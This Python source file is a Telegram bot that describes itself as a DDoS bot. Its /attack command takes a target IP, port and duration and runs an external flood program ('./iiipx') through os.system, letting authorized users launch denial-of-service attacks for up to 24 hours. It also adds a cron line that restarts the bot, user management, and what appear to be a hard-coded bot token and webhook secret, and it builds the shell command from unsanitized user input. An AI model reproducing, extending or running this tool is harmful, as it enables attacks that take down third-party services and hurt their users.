#!/usr/bin/env python3
"""
Telegram Bot with Webhook and DDoS Functionality

CRON SETUP:
*/5 * * * * pgrep -f bot.py || /usr/bin/python3 /path/to/bot.py >> /path/to/bot.log 2>&1 &
"""

import os
import sys
import threading
import asyncio
import logging
import datetime
import time
import subprocess
from flask import Flask, request, jsonify
from telegram import Update, Bot
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# ========== CONFIGURATION ==========
TOKEN = "7280791127:AAEG22FSjcgl1IiXsUHMKsFkknooOf1JkOQ"
ADMIN_ID = "6644586902"  # Must be string
SECRET_TOKEN = "f3a8b7c9d6e5a1b2c4d7e8f9a0b3c2d1"
authorized_users = set()
ATTACK_CMD = "./iiipx"  # Your attack command
# ===================================

# Enhanced logging setup
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

app = Flask(__name__)

def check_running() -> bool:
    """Check if another instance is already running"""
    try:
        output = subprocess.check_output(['pgrep', '-fl', 'python.*bot.py']).decode()
        return output.count('bot.py') > 1
    except subprocess.CalledProcessError:
        return False

@app.route('/webhook', methods=['POST'])
def webhook():
    """Handle incoming webhook requests"""
    try:
        # Authentication
        if request.headers.get('X-Secret-Token') != SECRET_TOKEN:
            logger.warning("Unauthorized webhook access attempt")
            return jsonify({"status": "error", "message": "Unauthorized"}), 403

        data = request.get_json()
        if not data:
            return jsonify({"status": "error", "message": "No data received"}), 400

        logger.info(f"Received webhook data: {data}")

        # Process in background thread
        threading.Thread(
            target=process_webhook_data,
            args=(data,),
            daemon=True
        ).start()

        return jsonify({"status": "success"}), 200

    except Exception as e:
        logger.error(f"Webhook error: {str(e)}", exc_info=True)
        return jsonify({"status": "error", "message": str(e)}), 500

def process_webhook_data(data: dict):
    """Process webhook data in background"""
    try:
        logger.info(f"Processing webhook data: {data}")
        # Add your custom processing here
    except Exception as e:
        logger.error(f"Error processing webhook: {str(e)}", exc_info=True)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    user = update.effective_user
    logger.info(f"Start command from {user.id}")
    await update.message.reply_text(
        "🚀 DDoS Bot Active\n"
        "Type /help for commands"
    )

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /help command"""
    help_text = """
🔧 <b>Available Commands:</b>

/start - Start bot
/help - Show this help
/attack IP PORT TIME - Launch attack
/adduser USER_ID - Add authorized user (Admin)
/removeuser USER_ID - Remove user (Admin)
/listusers - Show authorized users
/stats - Show bot statistics
    """
    await update.message.reply_text(help_text, parse_mode='HTML')

async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Add authorized user"""
    user = update.effective_user
    if str(user.id) != ADMIN_ID:
        logger.warning(f"Unauthorized adduser attempt by {user.id}")
        await update.message.reply_text("❌ Admin only command!")
        return

    if not context.args or len(context.args) != 1:
        await update.message.reply_text("Usage: /adduser USER_ID")
        return

    new_user = context.args[0]
    authorized_users.add(new_user)
    logger.info(f"Added user {new_user}")
    await update.message.reply_text(f"✅ Added user: {new_user}")

async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove authorized user"""
    user = update.effective_user
    if str(user.id) != ADMIN_ID:
        logger.warning(f"Unauthorized removeuser attempt by {user.id}")
        await update.message.reply_text("❌ Admin only command!")
        return

    if not context.args or len(context.args) != 1:
        await update.message.reply_text("Usage: /removeuser USER_ID")
        return

    target_user = context.args[0]
    if target_user in authorized_users:
        authorized_users.remove(target_user)
        logger.info(f"Removed user {target_user}")
        await update.message.reply_text(f"✅ Removed user: {target_user}")
    else:
        await update.message.reply_text(f"❌ User not found: {target_user}")

async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List authorized users"""
    user = update.effective_user
    if str(user.id) != ADMIN_ID:
        logger.warning(f"Unauthorized listusers attempt by {user.id}")
        await update.message.reply_text("❌ Admin only command!")
        return

    if not authorized_users:
        await update.message.reply_text("No authorized users")
        return

    users_list = "\n".join([f"• {uid}" for uid in authorized_users])
    await update.message.reply_text(
        f"👥 <b>Authorized Users ({len(authorized_users)}):</b>\n{users_list}",
        parse_mode='HTML'
    )

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle attack command"""
    user = update.effective_user
    user_id = str(user.id)
    
    # Authorization check
    if user_id not in authorized_users and user_id != ADMIN_ID:
        logger.warning(f"Unauthorized attack attempt by {user.id}")
        await update.message.reply_text("❌ You are not authorized!")
        return

    # Argument validation
    if len(context.args) != 3:
        await update.message.reply_text("Usage: /attack IP PORT DURATION")
        return

    ip, port, duration = context.args
    
    # Input validation
    try:
        port = int(port)
        duration = int(duration)
        if not (0 < port <= 65535):
            raise ValueError("Port must be 1-65535")
        if duration <= 0 or duration > 86400:  # Max 24 hours
            raise ValueError("Duration must be 1-86400 seconds")
    except ValueError as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")
        return

    # Start attack
    logger.info(f"Attack started by {user.id} on {ip}:{port} for {duration}s")
    await update.message.reply_text(
        f"🔥 <b>Attack Started</b>\n"
        f"🎯 Target: <code>{ip}:{port}</code>\n"
        f"⏱ Duration: {duration} seconds\n"
        f"👤 By: {user.first_name}",
        parse_mode='HTML'
    )

    # Run attack in background
    threading.Thread(
        target=execute_attack,
        args=(ip, port, duration, update.effective_chat.id, context),
        daemon=True
    ).start()

def execute_attack(ip: str, port: int, duration: int, chat_id: int, context):
    """Execute the actual attack command"""
    try:
        start_time = time.time()
        
        # Run attack command
        cmd = f"{ATTACK_CMD} {ip} {port} {duration}"
        logger.info(f"Executing: {cmd}")
        return_code = os.system(cmd)
        
        # Check result
        if return_code != 0:
            raise Exception(f"Attack failed with code {return_code}")
        
        # Send completion message
        elapsed = int(time.time() - start_time)
        asyncio.run(
            context.bot.send_message(
                chat_id=chat_id,
                text=f"✅ <b>Attack Completed</b>\n"
                     f"🎯 Target: <code>{ip}:{port}</code>\n"
                     f"⏱ Duration: {elapsed}s",
                parse_mode='HTML'
            )
        )
        
    except Exception as e:
        logger.error(f"Attack error: {str(e)}", exc_info=True)
        asyncio.run(
            context.bot.send_message(
                chat_id=chat_id,
                text=f"❌ <b>Attack Failed</b>\nError: {str(e)}",
                parse_mode='HTML'
            )
        )

def run_flask_server():
    """Run Flask web server"""
    app.run(host='0.0.0.0', port=8080, debug=False, use_reloader=False)

def run_telegram_bot():
    """Run Telegram bot"""
    application = ApplicationBuilder().token(TOKEN).build()
    
    # Add command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_cmd))
    application.add_handler(CommandHandler("adduser", add_user))
    application.add_handler(CommandHandler("removeuser", remove_user))
    application.add_handler(CommandHandler("listusers", list_users))
    application.add_handler(CommandHandler("attack", attack))
    
    logger.info("Starting Telegram bot...")
    application.run_polling()

def main():
    """Main application entry point"""
    # Check for existing instances
    if check_running():
        logger.error("Another instance is already running. Exiting.")
        sys.exit(1)

    # Add admin to authorized users
    if ADMIN_ID:
        authorized_users.add(ADMIN_ID)
        logger.info(f"Admin {ADMIN_ID} added to authorized users")

    # Start services in threads
    services = [
        threading.Thread(target=run_telegram_bot, daemon=True),
        threading.Thread(target=run_flask_server, daemon=True)
    ]

    for service in services:
        service.start()

    logger.info("All services started successfully")
    
    # Keep main thread alive
    try:
        while True:
            time.sleep(3600)  # Check every hour
    except KeyboardInterrupt:
        logger.info("Received shutdown signal")
    except Exception as e:
        logger.error(f"Fatal error: {str(e)}", exc_info=True)
    finally:
        logger.info("Bot shutdown complete")
        sys.exit(0)

if __name__ == '__main__':
    main()